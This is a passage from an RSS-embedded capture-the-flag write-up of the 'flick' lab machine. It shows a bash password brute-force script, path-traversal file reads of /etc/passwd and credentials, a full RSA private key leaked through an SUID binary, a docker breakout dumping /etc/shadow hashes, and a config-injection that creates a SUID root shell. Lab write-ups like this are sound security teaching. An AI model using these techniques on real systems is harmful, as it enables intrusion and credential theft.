+cookie=&amp;quot;laravel_session=eyJpdiI6ImxoMzM2R2xLU3lxcCtFTzl6SWY0RHlyQ1Q4SEpVeGs0bEJSd3hDc3BrdlE9IiwidmFsdWUiOiJtaHliTW9ZXC9nUXFnUVdQaEJvYmo4a2c3VEFXRWcxekQ0azdwTnh2a2pLR0ZSRm5Hd2E0dHdmWkVwT29pdVdZR0x0OHdEZkdqSHQ5RVNKdENSak9jYlE9PSIsIm1hYyI6ImIyMjNiYzYwNzE4ZTM4Mzg2NDQ2NDFlZGU3Y2QzMTEwNmYwYmVkY2IyMWY1ODZkMmE4NDA3YTQwZmE5YzRjZWIifQ%3D%3D&amp;quot;
+  
+while read p; do
+  
+        curl -s -L http://192.168.127.104/login/login -b &amp;quot;$cookie&amp;quot; --data &amp;quot;username=demo&amp;amp;password=$p&amp;quot; | grep incorrect &amp;gt; /dev/null
+  
+        if [[ $? -ne 0 ]]; then
+  
+                echo &amp;quot;Password is: $p&amp;quot;
+                break
+        fi
+  
+done &amp;lt; $wordlist
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vuln/flick# ./login.sh 
+Password is: demo123
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I was able to login and saw that new functionality in the application had become available - namely to upload files and download existing ones.  Upload functionality just screams PHP Shell upload - but long story short, it doesn&amp;rsquo;t work here ;)&lt;/p&gt;
+
+&lt;p&gt;With that avenue out, I looked at the download function more carefully.  The href for one of the download links, looks like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;http://192.168.127.104/image/download?filename=images/mPTRlZ8Bf3Wt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;From my experimentation with the upload function, I knew that files are assigned a seemingly random name with their extensions removed and placed into the images directory.&lt;/p&gt;
+
+&lt;p&gt;I wondered if this may be vulnerable to LFI.  So I began requesting &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;?filename=../../../../etc/passwd&lt;/code&gt; did not work, so perhaps there is some filtering in place?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vuln/flick# curl -s -L http://192.168.127.104/image/download?filename=..././..././..././..././etc/passwd -b &amp;quot;laravel_session=eyJpdiI6IjBUWTlcL0pZejRLNzYwMzlKb1dLYmdqQ1NOU0x1Z2NYM2Y3UXRYcHJocG1JPSIsInZhbHVlIjoid3VmZzQ5cmtvTDhOK09cL0ROeXpMZmY5WEwzT3Q0ZXRZTkpyQXJ4Mm9QdjJ1UGo5NDd0ZFFTRHU2MUJCRjRXdEhrcXRhRjRFWEZPeVFBbXBHcVwvSER4UT09IiwibWFjIjoiYjc4YWEyOWQwN2RkMzU1YWFkYTFkOTFhNDFiZThmNDUxNjgwNGRhMGUzZDM3M2QwMTE4NGFiYmNiMTE1MGFhYyJ9&amp;quot;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+landscape:x:104:109::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
+mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+dean:x:1001:1001:,,,:/home/dean:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that I could read files on the system, I began enumerating the system configs.  I started with the Apache config to find the web root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;?filename=..././..././..././..././etc/apache2/sites-enabled/000-default
+    DocumentRoot /var/www/flick_photos/public
+    &amp;lt;Directory /&amp;gt;
+        Options FollowSymLinks
+        AllowOverride None
+    &amp;lt;/Directory&amp;gt;
+    &amp;lt;Directory /var/www/flick_photos/public&amp;gt;
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        Order allow,deny
+        allow from all
+    &amp;lt;/Directory&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The technology behind the application has already been given away in the cookie header - Laravel.  A &amp;ldquo;PHP Framework For Web Artisans&amp;rdquo;.  A little bit of research will take you straight to their GitHub page, which is obviously really handy since you can view the entire application structure.  This gives you the exact filepaths to hit with the LFI.&lt;/p&gt;
+
+&lt;p&gt;I downloaded a few config files, including &lt;code&gt;app/config/database.php&lt;/code&gt;, which included an interesting commented line.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;&#39;database&#39; =&amp;gt; __DIR__.&#39;/../database/production.sqlite&#39;, // OLD DATABASE NO LONGER IN USE!&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;So I went ahead and downloaded this file too.  Even though it&amp;rsquo;s a binary file, enough of it is displayed in ASCII for it to be useable without having to download it to a file etc.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;** This file contains an SQLite 2.1 database **(u���x^�
+                                                           &amp;quot;^tableold_usersold_users3CREATE TABLE old_users (
+  username text,
+  password text
+)�xdI�IpaulnejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi�J�   JrobinJoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1J�   JjamesscujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5I�IdeanFumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA�
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I knew Robin and Dean were users on the system, so I tried SSH with the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;dean: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
+robin: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1J
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The creds for Robin did not work, but I was able to SSH as Dean.&lt;/p&gt;
+
+&lt;h2 id=&#34;dean:349ad66c7b20ba925d9eeb00398f8306&#34;&gt;Dean&lt;/h2&gt;
+
+&lt;p&gt;Dean has two files in his home directory:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;dean@flick:~$ ls -l
+-rw-r--r-- 1 root  root  1250 Aug  4 12:56 message.txt
+-rwsr-xr-x 1 robin robin 8987 Aug  4 14:45 read_docker
+  
+dean@flick:~$ cat message.txt 
+  
+Hi Dean,
+  
+I will be away on leave for the next few weeks. I have asked the admin guys to
+write a quick script that will allow you to read my .dockerfile for flick-
+a-photo so that you can continue working in my absense.
+  
+The .dockerfile is in my home, so the path for the script will be something like
+/home/robin/flick-dev/
+  
+Please call me if you have any troubles!
+  
+dean@flick:~$ strings read_docker 
+fopen
+[...snip...]
+/Dockerfile
+ERROR: A path is required!
+Usage is: %s /path/to/dockerfile
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So it appears this binary (which is owned by Robin and has the SUID bit set), simply opens a file called Dockerfile (which is hardcoded) when given a directory.  First I was able to read Robin&amp;rsquo;s Dockerfile as mentioned in the message.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;dean@flick:~$ ./read_docker /home/robin/flick-dev/
+# Flick-a-photo dev env
+RUN apt-get update &amp;amp;&amp;amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;amp;&amp;amp; apt-get clean &amp;amp;&amp;amp; rm -rf /var/lib/apt/lists/*
+  
+CMD [&amp;quot;/usr/sbin/apache2&amp;quot;, &amp;quot;-D&amp;quot;, &amp;quot;FOREGROUND&amp;quot;]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Because there doesn&amp;rsquo;t appear to be any sort of checks built into the binary, I thought it would be able to read any arbitary file that Robin has read permission for.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;dean@flick:~$ echo &amp;quot;This is a test&amp;quot; &amp;gt; /tmp/Dockerfile
+dean@flick:~$ ./read_docker /tmp/
+This is a test
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used this idea, and created a symlink to Robin&amp;rsquo;s private SSH key.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
+
+dean@flick:~$ ./read_docker .
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
+ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
+FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
+S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
+CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
+d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
+jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
+wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
+tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
+Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
+wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
+mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
+l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
+JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
+gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
+JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
+rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
+PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
+zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
+AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
+EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
+mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
+JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
+Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
+VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After copying this key to my Kali VM, I was able to SSH in as Robin :)&lt;/p&gt;
+
+&lt;h2 id=&#34;robin:349ad66c7b20ba925d9eeb00398f8306&#34;&gt;Robin&lt;/h2&gt;
+
+&lt;p&gt;There was nothing in Robin&amp;rsquo;s home directory, but a quick check of his sudo rights showed the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;robin@flick:~$ sudo -l
+  
+User robin may run the following commands on this host:
+    (root) NOPASSWD: /opt/start_apache/restart.sh
+  
+robin@flick:~$ ls -l /opt/start_apache/
+total 8
+-rwx------ 1 root root   79 Aug  4 17:04 restart.sh
+-rwx------ 1 root root 2285 Aug  4 17:09 start.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Because there is no read access to these scripts, I tried to blindly manipulate path variables to see if I could force it to execute a binary of my own choosing.  However, this did not work.  I moved back to this Docker idea and found that an older version was installed.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;robin@flick:~$ docker -v
+Docker version 0.11.0, build 15209c3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Some quick research into docker will show you that this version is vulnerable to a container breakout, allowing you to read any file on the system.  The more obvious path for this is to read &lt;code&gt;/etc/shadow&lt;/code&gt; or the root SSH key.  But I thought this would be a long shot, if root had a strong password and SSH access disabled.  It would allow me to read the contents of &lt;code&gt;restart.sh&lt;/code&gt; and &lt;code&gt;start.py&lt;/code&gt; however.&lt;/p&gt;
+
+&lt;p&gt;First, I listed all the current containers.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;robin@flick:~$ docker ps -l
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+da9387a40106        ubuntu:14.04        /bin/bash           8 minutes ago       Up 8 minutes                            compassionate_euclid
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can run one-off commands within the container:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;robin@flick:~$ docker run ubuntu id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Or you can interact with it through a console session:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;robin@flick:~$ docker run -t -i ubuntu
+root@af56205351e4:/#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, I was able to determine that IP traffic was routable between the container and the host.  Both the host and container had netcat installed, which means I was able to tranfer files in and out of the container.  I was able to use this to transfer the shocker exploit into the container.  Because &lt;code&gt;gcc&lt;/code&gt; was only install on the host, I had to compile it before moving it in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;robin@flick:~$ nc -lvv 4444 &amp;lt; shocker
+root@af56205351e4:/root# nc 192.168.127.104 4444 &amp;gt; shocker
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Executing shocker within the container, successfully dumped &lt;code&gt;/etc/shadow&lt;/code&gt; of the host!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@af56205351e4:/root# ./shocker 
+[***] docker VMM-container breakout Po(C) 2014             [***]
+[***] The tea from the 90&#39;s kicks your sekurity again.     [***]
+[***] If you have pending sec consulting, I&#39;ll happily     [***]
+[***] forward to my friends who drink secury-tea too!      [***]
+  
+&amp;lt;enter&amp;gt;
+  
+[*] Resolving &#39;etc/shadow&#39;
+  
+[…snip…]
+  
+[!] Win! /etc/shadow output follows:
+
+root:$6$rOirJ02l$HmauQaCRxYGzGyLeUcNOo0d9FkmJ0Hp2qA8DhAIWd7gJs32MskKYEf6dPxrwZ8XyaL0CXtFe4HBvtMHQCfLG80:16283:0:99999:7:::
+daemon:*:16283:0:99999:7:::
+bin:*:16283:0:99999:7:::
+sys:*:16283:0:99999:7:::
+sync:*:16283:0:99999:7:::
+games:*:16283:0:99999:7:::
+man:*:16283:0:99999:7:::
+lp:*:16283:0:99999:7:::
+mail:*:16283:0:99999:7:::
+news:*:16283:0:99999:7:::
+uucp:*:16283:0:99999:7:::
+proxy:*:16283:0:99999:7:::
+www-data:*:16283:0:99999:7:::
+backup:*:16283:0:99999:7:::
+list:*:16283:0:99999:7:::
+irc:*:16283:0:99999:7:::
+gnats:*:16283:0:99999:7:::
+nobody:*:16283:0:99999:7:::
+libuuid:!:16283:0:99999:7:::
+syslog:*:16283:0:99999:7:::
+messagebus:*:16283:0:99999:7:::
+whoopsie:*:16283:0:99999:7:::
+landscape:*:16283:0:99999:7:::
+sshd:*:16283:0:99999:7:::
+robin:$6$j5lRdjqM$HrKVVv4FSZ0StRLgXSe3Nt8bvsaE6yPdRRvggXdW4lIxmVs8t8ny1WWXNkdiF/ccAWU.jthvwQKgWAG5JtZBv1:16284:0:99999:7:::
+mysql:!:16283:0:99999:7:::
+dean:$6$kLXH5HBN$vAiHt14LlYtq9EDoIffiZFP9goUeyvn5cHTaehsysvg9TFQlSAMZuGer5OqEef2ONAeMHi6hU.OygO7Uo6b8Z.:16284:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Trying to grab the flag this way resulted in a bit of a troll :p&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Errr, you are close, but this is not the flag you are looking for.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;So I re-focussed on two scripts files within &lt;code&gt;/opt&lt;/code&gt;.  &lt;code&gt;Restart.sh&lt;/code&gt; is rather simple:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
+/usr/sbin/service apache2 restart
+/usr/bin/supervisorctl restart all
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A quick look at the supervisor config&amp;rsquo;s reveased the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;/etc/supervisor/conf.d/start_apache.conf
+  
+[program:start_apache]
+command=/opt/start_apache/start.py
+process_name = %(program_name)s-80%(process_num)02d
+stdout_logfile = /var/log/start_apache-80%(process_num)02d.log
+stdout_logfile_maxbytes=100MB
+stdout_logfile_backups=10
+numprocs=1
+directory=/opt/start_apache
+stopwaitsecs=1
+user=root
+stopasgroup=true
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So this runs &lt;code&gt;/opt/start_apache/start.py&lt;/code&gt;.  Finally, if we have a peak at that, we find that it&amp;rsquo;s the script responsible for the service on 8881 we used earlier.  Interestingly, there&amp;rsquo;s a little debugging snippet within the code.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# see if /tmp has a configuration to load.
+# Debugging purposes only!!!
+if os.path.isfile(&#39;/tmp/config.py&#39;):
+    sys.path.insert(0, &#39;/tmp&#39;)
+else:
+    sys.path.insert(0, &#39;/etc&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Fortunately, that file is word-reable, so we can take a peak.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;robin@flick:~$ cat /etc/config.py
+config = {
+    &#39;command&#39;: &#39;service apache2 restart&#39;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So all we require is to create &lt;code&gt;/tmp/config.py&lt;/code&gt; and populate it with our own commands.  I opted to make a copy of &lt;code&gt;/bin/sh&lt;/code&gt; and set the SUID bit for root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;/tmp/config.py
+config = {
+        &#39;command&#39;: &#39;cp /bin/sh /tmp/shell; chmod 4777 /tmp/shell&#39;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So when &lt;code&gt;restart.sh&lt;/code&gt; is run, it executes supervisor, which also starts the python service on 8881.  When the correct password is entered, instead of starting the apache service on port 80, it will execute our custom commands.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;robin@flick:~$ ls -l /tmp/ 
+-rwsrwxrwx 1 root  root  109768 Aug 16 20:52 shell
+  
+robin@flick:~$ /tmp/shell 
+# id; whoami
+uid=1000(robin) gid=1000(robin) euid=0(root) groups=0(root),999(docker),1000(robin)
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;game-over:349ad66c7b20ba925d9eeb00398f8306&#34;&gt;Game Over&lt;/h2&gt;
+
+&lt;p&gt;Before collecting the flag, I echo&amp;rsquo;d my public SSH key into root&amp;rsquo;s authorised_keys, set the correct owners, permissions etc and logged in as root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@flick:~# ls -l /root/
+total 8
+drwxr-xr-x 2 root root 4096 Aug  1 16:53 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
+-rw-r--r-- 1 root root   67 Aug  1 16:52 flag.txt
+  
+root@flick:~# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt 
+Congrats!
+  
+You have completed &#39;flick&#39;! I hope you have enjoyed doing it as much as I did creating it :)
+  
+ciao for now!
+@leonjza
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
